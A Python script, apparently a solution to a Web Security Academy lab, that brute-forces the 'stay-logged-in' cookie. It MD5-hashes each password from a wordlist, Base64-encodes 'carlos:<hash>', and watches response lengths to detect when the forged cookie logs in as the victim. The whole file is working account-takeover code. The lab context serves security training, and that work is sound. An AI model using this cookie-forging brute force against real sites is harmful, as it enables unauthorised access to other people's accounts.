import requests
import hashlib
import base64

url = 'https://0af1002a034e351b83c22eda0082009b.web-security-academy.net//my-account'


def password(url):
    length = 0
    wordlist_path = "passwords.txt"
    with open(wordlist_path, 'r') as file:
        payloads = file.read().splitlines()


    for payload in payloads:
        hash = hashlib.md5(payload.encode()).hexdigest()
        combined = f'carlos:{hash}'
        # Base64 encode the combined string
        payload = base64.b64encode(combined.encode()).decode()
        params = {f'id':'wiener'}
        response = requests.get(url, params=params, cookies={'stay-logged-in': f'{payload}'})
        if length == 0:
                length = len(response.text)
        else:
                if length != len(response.text) or length%100==0:
                    print(f"Payload: {payload} | response-length: {len(response.text)} | text: {response.cookies}")
                length = len(response.text)
        # print(f"Payload: {payload} | response-length: {len(response.text)} | text: {response.cookies}")



password(url)


